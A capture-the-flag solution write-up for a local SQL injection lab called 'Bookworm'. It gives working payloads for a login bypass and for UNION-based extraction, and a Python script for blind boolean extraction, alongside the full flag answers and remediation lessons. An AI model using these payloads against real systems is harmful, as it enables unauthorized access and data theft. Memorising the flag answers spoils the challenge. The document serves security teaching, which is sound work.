# 🚩 Bookworm — SOLUTION (SPOILERS)

> ⛔⛔⛔ **STOP.** Full answers to all three flags below. Close this if you're still
> solving. Kept as a personal write-up, not to read while playing.
>
> .
>
> .
>
> .
>
> .
>
> .
>
> .

---

## Flag 1 — Auth bypass (`FLAG{sql1_4uth_byp4ss_0r_1eq1}`)

The login query is built by string concatenation:

```sql
SELECT id, username FROM users WHERE username = '<u>' AND password = '<p>'
```

Make the `WHERE` always true. In the **username** field submit:

```
' OR '1'='1' --
```

(password anything). The query becomes:

```sql
SELECT id, username FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'
```

`'1'='1'` is always true, the `--` comments out the password check, and you're logged
in as the first row (`reader`). The dashboard shows Flag 1.

curl version (session cookie comes back on the redirect):

```bash
curl -s -c cookies.txt -d "username=' OR '1'='1' -- &password=x" \
     http://localhost:8086/login -L -b cookies.txt | grep FLAG
```

**Lesson:** never concatenate credentials into SQL. Parameterise
(`WHERE username = ? AND password = ?`) and compare a **hashed** password.

## Flag 2 — UNION-based extraction (`FLAG{un10n_s3l3ct_d4t4_3xf1ltr8}`)

`/search?q=` interpolates into a `LIKE` and renders two columns (title, author):

```sql
SELECT title, author FROM books WHERE title LIKE '%<q>%'
```

Two columns → a 2-column `UNION`. Close the `LIKE` string, union the secrets table,
comment the trailing `%'`:

```
%' UNION SELECT name, value FROM secrets -- 
```

Full URL:

```bash
curl -s "http://localhost:8086/search?q=%25%27%20UNION%20SELECT%20name,value%20FROM%20secrets%20--%20" | grep FLAG
```

The `catalog_license` row appears in the results table — that's Flag 2. (Don't know
the schema? Enumerate it: `%' UNION SELECT name, sql FROM sqlite_master -- `.)

Note: the members/catalog service and the book-viewer service use **separate
databases**, so this UNION can't reach `flag3` — that one is blind-only (below).

**Lesson:** same fix — parameterise. And a search feature should only ever `SELECT`
from the intended table; `UNION` reaching other tables means the query trusts input.

## Flag 3 — Blind boolean-based extraction (`FLAG{bl1nd_b00l3an_dr1p_dr1p}`)

`/book?id=` injects a **numeric** id and only reveals whether a row matched
("✅ in our catalog" vs "📕 no such book") — no data reflected.

Prove it:
- `id=1`         → book shown
- `id=1 AND 1=1` → book shown (TRUE)
- `id=1 AND 1=2` → no book    (FALSE)

The book-viewer service has its own DB with an `audit` table holding the token
(enumerate it blind via `sqlite_master` if you don't assume the name). Extract it one
char at a time by asking boolean questions:

```
id=1 AND substr((SELECT token FROM audit WHERE name='audit_token'),1,1)='F'
```

"✅" ⇒ char 1 is `F`. Walk the index (`,2,1`, `,3,1`, …) and alphabet. Script it:

```python
import requests, string
base = "http://localhost:8086/book"
charset = string.printable.strip()
flag = ""
for i in range(1, 60):
    for c in charset:
        payload = (f"1 AND substr((SELECT token FROM audit "
                   f"WHERE name='audit_token'),{i},1)='{c}'")
        r = requests.get(base, params={"id": payload})
        if "in our catalog" in r.text:
            flag += c
            print(flag)
            break
    else:
        break   # ran out of chars -> done
```

That drips out `FLAG{bl1nd_b00l3an_dr1p_dr1p}`.

**Lesson:** blind ≠ safe. If input reaches SQL at all, an attacker can exfiltrate the
whole DB one bit at a time. Parameterise the numeric id too (and validate it's an int).

---

### Full flag list
1. `FLAG{sql1_4uth_byp4ss_0r_1eq1}`   — auth bypass
2. `FLAG{un10n_s3l3ct_d4t4_3xf1ltr8}` — UNION extraction
3. `FLAG{bl1nd_b00l3an_dr1p_dr1p}`    — blind boolean extraction
